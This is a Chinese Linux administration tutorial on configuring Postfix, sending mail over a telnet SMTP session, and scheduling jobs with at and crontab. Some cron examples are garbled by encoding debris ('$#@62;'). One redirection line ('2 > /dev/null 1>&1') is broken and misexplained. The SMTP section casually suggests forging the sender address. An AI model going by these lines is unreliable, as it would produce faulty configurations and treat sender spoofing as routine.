Squirrelmail:Centos系统自带。
Extmail,Extman:国内开发的,也被称为EMOS系统。

6)Mail Relay
邮件中继,一封邮件只要不是发送给本域内用户的,比如从当前域发送到另一个域,或从当前域发送到另一个域然后转到另外一个域的,这就属于中继。但一般邮件服务器都会允许本地或本域内的用户进行中继,不然就只能在本域内发送邮件而不能给外部邮箱发送邮件。Postfix默认只能基于IP地址做中继认证。

7)SASL(simple authentication secure layer)
简单认证安全层,是一种用来扩充C/S模式验证能力的机制。在Postfix可以利用SASL来判断用户是否有权使用转发服务,或辨认谁在使用你的服务器。常用的Sasl有:
cyrus-sasl:Redhat系列自带的SASL认证框架。
dovecot-sasl:dovecot组件带的SASL认证框架。
courier-authlib:这是一个带有MTA,MDA以及SASL认证的软件,但是一般只是用它的SASL功能。

一个完整的邮件服务器由以下内容构成:
postfix(作为发送邮件服务器)+ dovecot(作为接收邮件服务器)+ mysql(作为数据库)
模式: C/S 模式或 B/S
端口:25
可以通过foxmail或outlook客户端,也可以通过网页来收邮件

mail, mailx都是收发邮件用的,类似浏览器的作用,叫做mail user agent.
sendmail,postfix是做邮件服务器的,类似apache, nginx的作用,可以用作mail transport agent

【 Postfix 】
Postfix是Wietse Venema在IBM的GPL协议之下开发的MTA(邮件传输代理)软件,用于发送并接收邮件和通过网络发送的电子邮件转发,是为了改良sendmail邮件服务器而产生的

1、postfix免费:postfix想要作用的范围是广大的Internet用户,试图影响大多数的Internet上的电子邮件系统,因此它是免费的。
2、更快:postfix在性能上大约比sendmail快三倍。一部运行postfix的台式PC每天可以收发上百万封邮件。
3、兼容性好:postfix是sendmail兼容的,从而使sendmail用户可以很方便地迁移到postfix。Postfix支持/var[/spool]/mail、/etc/aliases、 NIS、和 ~/.forward文件。
4、更健壮:postfix被设计成在重负荷之下仍然可以正常工作。当系统运行超出了可用的内存或磁盘空间时,postfix会自动减少运行进程的数目。当处理的邮件数目增长时postfix运行的进程不会跟着增加。
5、更灵活:postfix是由超过一打的小程序组成的,每个程序完成特定的功能,可以通过配置文件设置每个程序的运行参数。
6、安全性:postfix具有多层防御结构,可以有效地抵御恶意入侵者。如大多数的postfix程序可以运行在较低的权限之下,不可以通过网络访问安全性相关的本地投递程序等

邮件服务器工作在两种情况下:一种是相同域内转发;二是不同域内转发。所以MTA(postfix)内部一般都会有服务端(smtpd)、客户端(smtp)和MDA。smtpd邮件服务器非常简单,只负责转发邮件别的什么功能也没有并且发送方不管是什么地址都可以从smtpd服务器转发到目标地址。

邮件服务器两种工作机制:
1、相同域内转发:用户A通过工具连接到SMTPD服务端,然后发送一份邮件,而目标收件人是B用户。当SMPTD收到邮件后判断发现是同域内的用户就会直接启动MDA进程把邮件投进用户邮箱中,当用户通过MUA工具(如mail命令)就可以直接收到邮件。

2、不同域内转发:用户A通过工具连接到SMTPD服务端,然后发送一份邮件,而目标收件人是C用户。当SMPTD收到邮件后判断发现是不同域内用户就会启动SMTP客户端来转发此邮件。SMTP收到请求后就会解析对方MX记录,然后连接对方SMTPD服务器并把邮件发送过去。当对方SMTPD发现此邮件就是本域内的邮件后也会调用MDA进程把邮件投递进用户邮箱中,当用户通过MUA工具(如mail命令)就可以直接收到邮件。

可以使用 Postfix 内置的配置语法检查来测试配置文件,如果没用发现语法错误不会输出任何内容。
$ sudo postfix check

使用netstat来验证postfix是否正在监听25端口。
$ netstat -ant
tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN
tcp6 0 0 :::25 :::* LISTEN

$ postconf [OPTION]
-d:显示Postfix默认的配置;
-n:显示新修改的配置;
-m:显示支持的存储文件类型如hash,mysql等;
-a:显示支持sasl的客户端插件类型;

Postfix进程
master:这条进程是Postfix邮件系统的大脑,它产生所有其他进程。
smtpd:作为服务器端程序处理所有外部连进来的请求。
smtp:作为客户端程序处理所有对外发起连接的请求。
qmgr:它是Postfix邮件系统的心脏,处理和控制邮件队列里面的所有消息。
local:这是Postfix自有的本地投递代理MDA,就是它负责把邮件保存到邮箱里。

配置
postfix主配置文件进行模块化了,其中:
/etc/postfix/main.cf:这个文件保存全局配置信息,所有进程都会用到,除非这些配置在master.cf文件中被重新设置了。
/etc/postfix/master.cf:这个文件保存了额外的进程运行时环境参数,在main.cf文件中定义的配置可能会被本文件的配置覆盖掉。
在配置文件中所有的参数都必须顶格写不然就会当做是上一行参数的续写。另外postfix大部分配置文件都进行默认化处理了,可以使用postconf -d进行查看

main.cf参数
$cat /etc/postfix/main.cf
inet_protocols = all  # 指定协议,接受来自所有网络的请求
inet_interfaces = 192.168.60.10,127.0.0.1 # 指定postfix系统监听的网络接口。
myhostname = mail.ywnds.com  # 设置系统的主机名
mydomain = ywnds.com  # 设置域名(设置为E-mail地址"@"后面的部分),默认postfix将myhostname的第一部分删除而作为mydomain的值。
myorigin = $mydomain  # 用来自动补全本域用户,用来指明发件人所在的域名,即做发件地址伪装。
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain  # 定义了Postfix接收邮件时的收件人域名,即Postfix要接收哪些域名的邮件,不在此区域内的都算是中继邮件,如果不加$mydomain的话那么就不允许收本域内邮件。
mynetworks = 127.0.0.0/8  # 根据网络地址中继,默认给你所在的整个网络中继,postfix系统根据其值来区别用户是远程还是本地的,这里设置只给本机中继。
message_size_limit = 20485760
mailbox_size_limit = 5097152000
show_user_unknown_table_name = no  # 邮件大小限制为20M,邮箱大小限制为5G。
bounce_queue_lifetime = 1d
maximal_queue_lifetime = 1d   # 队列超时限制为1天。
home_mailbox = Maildir/       # 指定用户邮箱目录
home_mailbox = Mailbox
# 邮箱投递方式有两种:一种是Mailbox方式即同一个用户的所有邮件内容存储为单个文件,通常保存在/var/spool/mail/目录下文件名与用户名相同(Postfix默认使用);第二种是Maildir方式,即使用目录结构来存储用户的邮件内容每一个用户使用一个文件夹,每封邮件都作为一个独立的文件存放。Maildir方式的存取速度和效率要好一些对于管理邮件内容页更加方便。
mailbox_command = /some/where/procmail  # 配置MDA使用procmail方式(postfix默认的投递代理)。

1、在postfix的配置文件中,参数行和注释行是不能处在同一行中的;
2、任何一个参数的值都不需要加引号,否则,引号将会被当作参数值的一部分来使用;
3、每修改参数及其值后执行 postfix reload 即可令其生效;但若修改了inet_interfaces,则需重新启动postfix;
4、如果一个参数的值有多个,可以将它们放在不同的行中,只需要在其后的每个行前多置一个空格即可;postfix会把第一个字符为空格或tab的文本行视为上一行的延续;

SMTP协议发送邮件命令
[root@localhost ~]# telnet localhost 25            # 1、telnet连接邮件服务器
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 localhost.localhostdomain ESMTP Postfix (Ubuntu)
HELO localhost                   # 2、HELO和SMTP服务器打招呼
250 sina.com
MAIL FROM:heiying6958@sina.com   # 3、MAIL FROM:告知SMTP服务器发件人地址
250 2.1.0 Ok
RCPT TO:root                     # 4、RCPT TO:告知服务器收件人地址,本服务器用户或其他邮件地址
250 2.1.5 Ok
DATA                             # 5、告知服务器开始传送数据了
354 End data with < CR>< LF>.< CR>< LF>
Subject: A Test Mail             # 6、邮件主题
hi! this is a tet mail           # 7、邮件内容
.                                # 8、告知服务器邮件写完了
250 2.0.0 Ok: queued as A83C32900000001B367
QUIT                             # 9、退出连接
221 2.0.0 Bye
Connection closed by foreign host.
[root@localhost ~]# mail                           # 测试本地root收件
"/var/mail/berlin75": 1 message 1 unread
>U   1 Mail Delivery Syst Tue Nov 12 23:36  79/2938  Undelivered Mail Returned to Sender
?

SMTP状态码:
1xx:纯信息
2xx:正确
3xx:上一步操作尚未完成,需要继续补充
4xx:暂时性错误
5xx:永久性错误

SMTP协议非常简单,简单到允许任何用户发送邮件同时也允许发送到任何用户。在发件人(MAIL FROM)哪里可以随意指定地址。但是收件人(RCPT TO)可以发给本域内用户也可以通过中继发送给其他域用户。如163或QQ邮箱。但是一般公网邮箱都是需要进行发件人域名反向解析,如果能解析就接收邮件,不能解析就丢失邮件。如果全部解析就有点太苛刻了,也可以针对部分域名进行解析。不信你可以把发件人改为xxx@taobao.com试试你的收件人还能不能收到邮件。(如果输入错误信息可以按Ctrl加退格键即可)

Postfix默认允许本机和本机所在网络的所有主机都允许中继,所以可以发给其他域邮件,但由于上面是用来了指令"mynetworks = 127.0.0.0/8"表示只给本机中继,所以其他主机是无法发送邮件给其他域的

127.0.0.1跟192.168.60.10虽然都能访问本机,但它们两的意义不同,127.0.0.1是在本机内部,而192.168.60.10是通过网卡的

创建两个邮箱测试用户并给密码(密码也同用户名)
$ useradd -s /sbin/nologin openstack
$ useradd -s /sbin/nologin hadoop

【 邮件别名 】
邮件别名可以把发送给一个用户的邮件转给另外一个用户,可以在/etc/aliases文件中可以定义用户别名格式如下:

Openstack:  root
表示所有发给Openstack用户的邮件,都发送给root用户。但是Postfix不会使用这个文件因为在文本文件中检索太慢了,所以需要通过hash编码转换为另外一种格式/etc/aliases.db(postfix支持hash格式),而newaliases命令就可以进行它们之间的相互转码的,直接执行命令newaliases即可。

【 邮件队列 】
Postfix维护两个队列:未决邮件队列(pending mails queue)和等待邮件队列(deferred mail queue)。等待队列包含了暂时发送失败、需要重新发送的邮件,Postfix会定期重发(默认5分钟,可自定义设置)。

其实Postfix维护5个队列:
输入队列,邮件进入Postfix系统的第一站;
活动队列,qmgr 将输入队列的邮件移到活动队列;
等待队列,保存暂时不能发送出去的邮件;
故障队列,保存受损或无法解读的邮件;
保留队列,将邮件无限期留在 Postfix 队列系统中;

列出邮件队列
$ postqueue -p

删除所有队列邮件
$ postsuper -d ALL deferred

删除所有邮件
$ postsuper -d ALL

发送一份邮件一般也可使用tail /var/log/maillog查看邮件队列日志信息,如"status=sent"表示邮件发送成功,而"status=deferred"表示邮件在等待队列。

</pre>
</div>

<div id="crontab">
<h3>sleep命令 暂停;休眠</h3><pre>
默认sleep后面的数值表示秒数,也可以指定其表示分钟或小时或天:
m:minute的缩写,表示分钟
h:hour的缩写,表示小时
d:day的缩写,表示天

$ sleep 15m

<h3>at命令</h3><pre>
at命令用于在指定时间执行命令,执行一次性定时任务

at允许使用一套相当复杂的指定时间的方法。
能接受在当天的hh:mm(小时:分钟)式的时间指定,该时间已过去就放在第二天执行
能用midnight(深夜),noon(中午),teatime(饮茶时间,一般是下午4点)等比较模糊的词语来指定时间。
能采用12小时计时制,即在时间后面加上AM(上午)或PM(下午)来说明是上午还是下午。
能指定命令执行的具体日期,指定格式为month day(月 日)或mm/dd/yy(月/日/年)或dd.mm.yy(日.月.年),指定的日期必须跟在指定时间的后面。

上面介绍的都是绝对计时法,还能够使用相对计时法,这对于安排不久就要执行的命令是很有好处的。
指定格式为:now + count time-units,now就是当前时间,time-units是时间单位,这里可以是minutes(分钟)、hours(小时)、days(天)、weeks(星期)。count是时间的数量,几天还是几小时等
更有一种计时方法就是直接使用today(今天)、tomorrow(明天)来指定完成命令的时间

Usage: at [-V] [-q x] [-f file] [-mMlbv] timespec ...
       at [-V] [-q x] [-f file] [-mMlbv] -t time
       at -c job ...
       atq [-V] [-q x]
       at [ -rd ] job ...
       atrm [-V] job ...
       batch

at(选项)(参数)

选项
-v 显示任务将被执行的时间
-c 打印任务的内容到标准输出
-d 删除指定的待执行任务
-V 显示版本信息
-l 显示待执行任务的列表
-m 当指定的任务被完成之后,将给用户发送邮件,即使没有标准输出
-q<列队> 使用指定的列队,指定新任务的队列名称
-f<文件> 从指定文件读入任务而不是从标准输入读入
-t<时间参数> 以时间参数的形式提交要运行的任务

参数
日期时间:指定任务执行的日期时间。

计划任务设定后,在没有执行之前可用atq命令查看系统没有执行的工作任务,atq命令(queue队列)可以列出正等待执行的at任务队列
atrm命令(remove)可以删除正在等待执行的at任务,后接at任务的编号如1、2...

$ sudo service atd start  # 开启atd服务

$ at 12:25       # 回车
warning: commands will be executed using /bin/sh
at> touch a.txt;date >~/log
at> < EOT >      # 输入在指定时刻想要执行的其他命令,没有后续命令时ctrl+d自动输出EOT,End Of Transmission传输结束
job 1 at Tue Jul  3 12:25:00 2018
$ at -c 8        # 显示已经设置的任务内容

$ at 17:12 tomorrow
$ at 17:12 12/10/15    # 美国日期的格式
$ at now +10 minutes
$ at now +7 weeks

$ at now+2minutes
at> /root/hello.sh >> /root/hello.log
at> < EOT >
job 1 at Tue Jul  3 12:25:00 2018
$ cat /root/hello.sh
#!/bin/bash
echo hello

# 在指定时间同步数据之后重启系统
$ at 02:00 2018-07-05
at> /bin/sync
at> /sbin/shutdown -r now

【 at任务计划的运行方式 】
用at命令产生所要运行的计划任务,并将这个计划任务以文字档的方式写入/var/spool/at/目录内,该工作便能等待atd服务的取用与运行

并不是所有的人都可以进行at计划任务,因为系统安全的原因。很多主机被所谓的攻击破解后,最常发现的就是他们的系统当中多了很多的黑客程序, 这些程序非常可能运用一些计划任务来运行或搜集系统运行信息,并定时的发送给黑客,所以除非是认可的帐号,否则先不要让他们使用at命令

【 at访问控制 】
可以利用/etc/at.allow与/etc/at.deny这两个文件来进行at的使用限制。加上这两个文件后at的工作情况是这样的:
先找寻/etc/at.allow这个文件,写在这个文件中的使用者才能使用at,没有在这个文件中的使用者则不能使用at(即使没有写在at.deny当中);
如果/etc/at.allow不存在就寻找/etc/at.deny文件,写在at.deny的使用者则不能使用at,没有在这个at.deny文件中的使用者就可使用at命令
如果两个文件都不存在,那么只有root可以使用at这个命令。

/etc/at.allow是管理较为严格的方式,而/etc/at.deny则较为松散(因为帐号没有在该文件中就能够运行at)。在一般的distributions当中,由于假设系统上的所有用户都是可信任的,因此系统通常会保留一个空的/etc/at.deny文件允许所有人使用at命令
不过万一不希望有某些使用者使用at的话,将那个使用者的帐号写入/etc/at.deny即可,一个帐号写一行。

</pre>

<h3>crontab定时执行任务 任务调度 类似于windows的计划任务</h3><pre>
通过crontab命令可以在固定的间隔时间执行指定的系统指令或shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常适合周期性的日志分析或数据备份等工作
最常见的自动化系统管理和自动维护工作,比如每天发出的按计划完成了备份的通知,或按计划定时清理/tmp/目录的通知、定时邮件提醒
当安装完成操作系统后,默认会安装此服务工具,并自动启动crond进程,crond进程每分钟会定期检查是否有要执行的任务,如果有要执行的任务则自动执行该任务

【 cron服务 】
cron是linux下的定时执行工具,可以在无需人工干预的情况下运行作业

在LINUX中周期执行的任务一般由cron这个守护进程来处理
cron是linux系统默认自带的系统服务,开机就自动启动,cron启动后会读取它的所有配置文件(全局性配置文件/etc/crontab及每个用户的计划任务配置文件,这些配置文件中包含了命令行及其调用时间),然后cron会根据命令和执行时间来调度工作任务。
cron的配置文件称为"crontab",是"cron table"的简写
ps -ef|grep cron

/etc/init.d/cron
service cron start            # 启动服务
service cron stop             # 关闭服务
service cron restart          # 重启服务
service cron reload           # 重新载入配置
service cron status           # 查看服务状态
ntsysv                        # 查看crontab服务是否已设置为开机启动
chkconfig –level 35 crond on  # 加入开机自动启动

tail -f /var/log/cron.log     # 查看日志看某个job有没有执行/报错

【 crontab命令 】
crontab命令用于安装、删除或列出用于驱动cron后台进程的表格,用户把需要执行的命令序列放到crontab文件中以获得执行。

命令格式
crontab [-u user] file
crontab [ -u user ] [ -i ] { -e | -l | -r }

命令参数
-u user:用来设定某个用户的crontab服务,一般在root用户或高权限的用户设定其他有权限用户的crontab的时候使用,默认当前用户
crontab是用来让使用者在固定时间或固定间隔执行程序,也就是类似使用者的时程表。-u user是指设定指定user的时程表,这个前提是必须要有其权限(比如root)才能够指定他人的时程表。如果不使用-u user就是表示设定自己的时程表

file:file是cron配置文件(cron脚本)的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件,crontab命令将接受标准输入(键盘)上键入的命令,并将它们载入crontab。

-e:edit user's crontab,编辑某个用户的crontab文件内容,如果文件不存在会自动创建。没指定用户则表示编辑当前用户的crontab文件
-l:list user's crontab,显示某个用户的crontab文件内容,如果不指定用户则表示显示当前用户的crontab文件内容。
-r:delete user's crontab,从/var/spool/cron目录中删除某个用户的crontab文件,如果不指定用户则默认删除当前用户的crontab文件,如果仅仅是想要删除一项工作的话必须要使用crontab -e去编辑
-i:prompt before deleting user's crontab,-ir表示在删除用户的crontab文件时给确认提示

crontab –l                 # 列出当前用户计划的cron作业
crontab –l –u username     # 列出指定用户的cron作业
crontab -l > $HOME/mycron  # 在$home目录中对crontab文件备份
crontab -e                 # 添加一个新cron作业或编辑现有的cron作业,当结束编辑离开时编辑后的文件将自动安装
crontab –r                 # 移除已经计划的cron作业
crontab –ir                # 用户确认之后再移除已经计划的cron作业

【 创建cron作业 】
新创建的cron作业不会马上执行,至少要过2分钟才执行,如果重启cron服务则会马上执行

任意用户下输入"crontab -e"即可进入任务编写,crontab默认编辑器为nano,可用sudo select-editor命令修改crontab默认编辑器为vi或其他的编辑器
SHELL=/bin/bash
HOME=/
* * * * * echo `date` >> /home/berlin75/test.txt
保存退出之后就可以去看看test.txt"是否有内容

# 编写cron脚本,命名为crontest.cron
15,30,45,59 * * * *  echo 'date' >> /tmp/test.txt
# 添加定时任务。执行命令
crontab ~/crontest.cron > ~/log
# 查看定时任务是否成功或检测/var/spool/cron目录下是否生成对应的cron脚本
crontab -l

每分钟输出文本并把文本发送到user@vexxhost.com邮箱
# crontab –e
SHELL=/bin/bash
HOME=/
MAILTO="user@vexxhost.com"
# This is a comment
* * * * * echo 'test cron job to execute every minute'

调度某个cron作业在"每个星期四的下午7:00"运行
$ crontab -e
00 19 * * 4 sh /root/test.sh

写cron脚本文件,命名为crontest.cron
15,30,45,59 * * * * echo "xgmtest....." >> xgmtest.txt  # 每隔15分钟执行一次打印命令
添加定时任务,执行命令crontab crontest.cron
"crontab -l"查看定时任务是否成功或检测/var/spool/cron下是否生成对应cron脚本

执行shell 脚本,比如每隔3分钟执行一次/var/backups/test.sh 文件,cron 格式如下:
*/3 * * * * /var/backups/test.sh
文件 /var/backups/test.sh 的内容如下:
#!/bin/sh
cd /var/backups/
Now=`date '+%Y%m%d'`
tar -zcf /var/backups/${Now}Website.tar.gz /var/www/html/

【 crontab的文件格式 】
crontab文件(cron脚本)每行都包括六个域,其中前五个域是指定命令被执行的时间,最后一个域是要被执行的命令,如果要执行的命令太多,可以把这些命令写到一个脚本里面,然后在这里直接调用这个脚本就可以了,调用的时候记得写出命令的完整路径

/etc/crontab文件中的每一行都代表一项任务,每个域之间使用空格或制表符分隔:
minute hour day-of-month month-of-year day-of-week commands
分 时 日 月 星期 要运行的命令

第1列分钟0~59,每分钟用*或*/1
第2列小时0~23(0表示子夜)
第3列日1~31
第4列月1~12 OR jan,feb,mar,apr ...
第5列星期0~7(0和7表示星期天)OR sun,mon,tue,wed,thu,fri,sat
第6列要运行的命令,命令可以是ls /proc >> /tmp/proc之类的命令,也可执行自定义脚本的命令

日期和星期字段都存在值的时候满足任意条件就执行
0 11 4 * 1-3 date      # 每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点
0 11 4 * mon-wed date  # 每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点
0 4 1 jan * date       # 1月份日早上4点

每天3.20执行用户目录下的两个指令,每个指令以;分隔
20 3 * * * (/bin/rm -f expire.ls logins.bad;bin/expire$#@62;expire.1st)

每年一月和四月,4号到9号的3点12分和3点55分执行/bin/rm -f expire.1st指令,并把结果添加到用户主目录下mm.txt文件之后
12,55 3 4-9 1,4 * /bin/rm -f expire.1st$#@62;$#@62;mm.txt

星号(*)
代表所有可能的值,如month字段是星号则表示在满足其它字段的制约条件后每月都执行该命令操作,hour为*表示每小时都要执行

逗号(,)
可以用逗号隔开的值指定一个列表范围,例如"1,2,5,7,8,9",当minute为a,b,c,...时表示第a,b,c,...分钟要执行
如果同一时刻启动多个流程的话系统就会变得相当繁忙,可以用逗号将分钟数错开

中杠(-)
可以用整数之间的中杠表示一个整数范围,例如"2-6"表示"2,3,4,5,6",当minute为a-b时表示从第a分钟到第b分钟这段时间内要执行

正斜线(/)
可以用正斜线指定时间的间隔频率,例如"0-23/2"表示每两小时执行一次,正斜线可以和星号一起使用如*/10,如果用在minute字段则表示每十分钟执行一次。当minute为*/n时表示每n分钟个时间间隔执行一次

井号(#)
开头为井号(#)的行是注释,不会被处理

crontab使用最小纬度为分钟,如果要精确到秒可以用添加多个crontab用添加sleep的方式进行
如每10秒执行监控脚本/root/scripts/monitor.sh
* * * * * /bin/bash /root/scripts/monitor.sh
* * * * * sleep 10;/bin/bash /root/scripts/monitor.sh
* * * * * sleep 20;/bin/bash /root/scripts/monitor.sh
* * * * * sleep 30;/bin/bash /root/scripts/monitor.sh
* * * * * sleep 40;/bin/bash /root/scripts/monitor.sh
* * * * * sleep 50;/bin/bash /root/scripts/monitor.sh

</pre><textarea>每天早上6点,单纯echo,从屏幕上看不到任何输出,因为cron把任何输出都email到root的信箱了
0 6 * * * echo "Good morning." >> /tmp/test.txt
0 */2 * * * echo "Have a break now." >> /tmp/test.txt       # 每两个小时
0 23-7/2,8 * * * echo "Have a good dream" >> /tmp/test.txt  # 晚上11点到早上8点之间每两个小时和早上八点

00 15 * * 1,3,5 shutdown -r +5     # 每周一,三,五的下午3:00系统进入维护状态,重新启动系统
10,40 * * * * innd/bbslink         # 每小时的10分,40分执行用户目录下的innd/bbslin指令
1 * * * * bin/account              # 每小时的1分执行用户目录下的bin/account指令
0 7 * * * /bin/ls                  # 每天早上7点执行一次/bin/ls
0 6-12/3 * 12 * /usr/bin/backup    # 在12月内每天的早上6点到12点中每隔3个小时执行一次/usr/bin/backup
20 0-23/2 * * * echo "haha"        # 每月每天的午夜0点20分,2点20分,4点20分....执行echo "haha"
10 6 * * * date                    # 每天早上6点10分
0 */2 * * * date                   # 每两个小时
0 4 1 1 * date                     # 1月1日早上4点
0 23-7/2,8 * * * date              # 晚上11点到早上8点之间每两个小时,早上8点
5,15,25,35,45,55 16,17 * * * date  # 每天下午4点、5点的5min、15min、25min、35min、45min、55min时执行命令
*/1 * * * * date >> /tmp/testCron.txt

59 23 1 5 * mail kiki < /home/lover.txt
0 17 * * 1-5 mail -s "hi" alex@domain.name < /tmp/maildata  # 周一到周五每天下午5:00发邮件给alex@domain.name

30 21 * * * /usr/local/etc/rc.d/lighttpd restart       # 每晚的21:30重启apache
45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart  # 每月1、10、22日的4:45重启apache
10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart      # 每周六、周日的1:10重启apache
0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart  # 在每天18:00至23:00之间每隔30分钟重启apache
0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart        # 每星期六的11:00pm重启apache
0 */1 * * * /usr/local/etc/rc.d/lighttpd restart       # 每一小时重启apache
0 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart    # 晚上11点到早上7点之间每隔一小时重启apache
0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart  # 每月的4号与每周一到周三的11点重启apache
0 4 1 jan * /usr/local/etc/rc.d/lighttpd restart       # 一月一号的4点重启apache

</textarea><pre>
【 Cron配置类型 】
Cron有两种配置文件类型用于调度自动化任务。

1)用户级Crontab
用户级的cron作业是针对每个用户单独分开的,因此每个用户都可以使用crontab命令创建自己的cron作业,还可以使用crontab –e命令编辑或查看自己的cron作业。
/var/spool/cron/目录下存放的是每个用户包括root的crontab任务,每个任务以创建者的名字命名,比如tom建的crontab任务对应的文件就是/var/spool/cron/tom,一般一个用户最多只有一个crontab文件
/var/spool/cron下的crontab文件不可以直接创建或修改,只可以用crontab -e来编辑
cron启动后每过一份钟读一次这个文件,检查是否要执行里面的命令。因此此文件修改后不需要重新启动cron服务
crontab -e操作是直接替换该用户下的crontab,而不是新增

2)系统级Crontab
cron服务每分钟不仅要读一次/var/spool/cron内的所有文件,还需要读一次/etc/crontab,因此我们配置这个文件也能运用 cron服务做一些事情。用crontab配置是针对某个用户的,而编辑/etc/crontab是针对系统的任务

这些cron作业被系统服务和关键作业所使用,且需要root级的权限才能执行。可以在/etc/crontab文件中查看系统级的cron作业
/etc/crontab文件负责安排由系统管理员制定的维护系统以及其他任务的crontab
系统任务调度:系统周期性所要执行的工作,比如写缓存数据到硬盘、日志清理等

berlin75@LAPTOP-0KMQM01D:/etc$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron ||( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron ||( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron ||( cd / && run-parts --report /etc/cron.monthly )
#

有时创建了一个crontab,但这个任务却无法自动执行,而手动执行这个任务却没有问题,这种情况一般是由于在crontab文件中没有配置环境变量引起的。在crontab文件中定义多个调度任务时需要特别注环境变量的设置,因为手动执行某个任务时是在当前shell环境下进行的,程序当然能找到环境变量,而系统自动执行任务调度时是不会加载任何环境变量的,因此就需要在crontab文件中指定任务运行所需的所有环境变量,这样系统执行任务调度时就没有问题了。

command要运行的程序,程序被送入sh执行,这个shell只有USER,HOME,SHELL这三个环境变量
前几行是用来配置crond任务运行的环境变量:
SHELL变量指定了系统要使用哪个shell
PATH变量指定了系统执行命令的路径,脚本里面调用函数等尽量使用全路径避免未知错误或添加export PATH=`环境变量`
HOME变量指定了在执行命令或脚本时使用的主目录
MAILTO变量表示出现错误或有数据输出时数据作为邮件发给这个帐号,crontab将stdout内容以邮件的形式发送到MAILTO定义的邮箱中
将脚本中的output和warning信息会以邮件形式发送给任务所有者,root无法在用户端收信,通常都將这个e-mail改成自己的账号

MAILTO="myuser@mydomain.com"
*/2 * * * * /usr/bin/ping -c 4 www.baidu.com  # 执行结果不要重定向,否则是不会发邮件的。

MAILTO=username1@mail.com,username2@mail.con  # 定义多个邮箱逗号分割
0,15,30,45 * * * * /usr/test.sh 2 > /dev/null 1>&1
在执行程序时只有错误输出才会输出,程序的错误输出到/dev/null即清空,后面的1>&1表示前面程序的输出结果保存

要注意清理系统用户的邮件日志
每条JOB执行完毕之后系统会自动将输出发送邮件给当前系统用户,日积月累日志信息非常的多甚至会撑爆整个系统,所以每条JOB命令后面进行重定向处理是非常必要的:>/dev/null 2>&1,这样就不会收到邮件,前提是对Job中的命令需要正常输出已经作了一定的处理,比如追加到某个特定日志文件

禁止Crontab产生邮件,避免 /var/mail/root 体积快速增长
1、在crontab末尾加上 >/dev/null 2>&1 或 &> /dev/null
2、MAILTO=""

0 1 5 10 * /path/to/script.sh >/dev/null 2>&1
0 1 5 10 * /path/to/script.sh &> /dev/null
*/15 * * * * nohup curl http://127.0.0.1:8011/ipos/cron/cron_danju.php >/dev/null 2>&1
*/1 * * * *  nohup curl http://192.168.1.1:8080/ipos/cron/cron_sys.php &>> /tmp/log
0 3 * * *  /root/dbbackup.sh >/dev/null 2>&1
0 5 * * * service httpd restart >/dev/null 2>&1
* * * * * sleep 5; /bin/date >>/root/cron-scvip.sh

01 * * * * root run-parts /etc/cron.hourly
在run-parts这一行以后的命令,五个数字后面接的是root代表执行的级别为root身份,也可以将这一行改为成其他的身份
而run-parts代表后面接的/etc/cron.hourly是一个目录内(/etc/cron.hourly)的所有可执行文件
每个小时的01分,系统会以root身份去/etc/cron.hourly目录下执行所有可执行的文件

3)除了通过配置文件来处理计划cron作业之外,还有别的方法可以做到。系统在/etc目录下预设了这4个目录:cron.daily、cron.hourly、cron.monthly、
cron.weekly等,把cron脚本放入这些目录中即可,还不需要使用到crontab -e的程式,系统会根据这些目录名定时执行这些作业脚本的

使用run-parts脚本来执行/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly和/etc/cron.monthly目录中的shell脚本文件,这些脚本被相应地每小时、每日、每周、或每月执行,如果去掉这个参数的话,后面就可以写要运行的某个脚本名,而不是文件夹名

# mkdir /etc/cron.min
*/5 * * * * root run-parts /etc/cron.min    # 每5分钟以root身份执行/etc/cron.min目录下的所有shell脚本

01 * * * * root run-parts /etc/cron.hourly  # 每小时执行/etc/cron.hourly内的脚本
02 4 * * * root run-parts /etc/cron.daily   # 每天执行/etc/cron.daily内的脚本
22 4 * * 0 root run-parts /etc/cron.weekly  # 每星期执行/etc/cron.weekly内的脚本
42 4 1 * * root run-parts /etc/cron.monthly # 每月去执行/etc/cron.monthly内的脚本

4)使用者也可以将所有的设定先存放在档案file中,用crontab file的方式来设定时程表。
cron会将file中的任务拷贝到用户的任务中

5)/etc/cron.d/目录用来存放任何要执行的crontab文件或脚本。
如果某cron任务需要根据调度来执行,是系统自动定期需要做的任务,而不是每小时、每日、每周或每月地执行,它可以被添加到/etc/cron.d目录中,该目录中的所有文件使用和/etc/crontab中一样的语法,如果是按小时按天按星期按月的来执行的话则可以放到前面相应的目录下面去

【 crontab邮件 】
crontab发送邮件功能需要先安装邮件服务器的要先安装sendmail、postfix

crontab输出内容发送到指定邮箱
YourCommand >tmpfile
cat tmpfile | mailx -s "Test Mail" deadwind@CU.com
cat tmpfile >>YourLog

crontab的邮件发送机制
如果crontab执行脚本时stdout有输出则会以邮件的形式发送到crontab当前用户,这些信息往往携带了错误信息,可帮助管理员排错
想要看到crontab报警邮件需要有邮件服务器,在centos/RHEL,ubuntu/Debian等主流发行版都会有一个mailutils软件包,这个软件包邮件服务端软件postfix/sendmail和客户端软件mail
早一些的发行版如centos/RHEL5优先依赖的是sendmail,centos6,ubuntu12.04等新一些的发行版优先依赖的是postfix
